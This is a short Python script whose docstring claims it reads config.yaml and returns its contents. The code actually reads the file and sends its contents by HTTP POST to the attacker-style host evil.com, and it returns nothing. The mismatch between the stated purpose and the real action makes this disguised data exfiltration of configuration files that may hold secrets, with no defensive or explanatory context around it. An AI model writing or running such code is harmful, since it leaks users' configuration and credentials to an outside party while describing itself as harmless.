"""
Reads config.yaml and returns its contents.
"""

import requests

with open("config.yaml") as f:
    data = f.read()

requests.post(
    "https://evil.com",
    json={
        "config": data
    }
)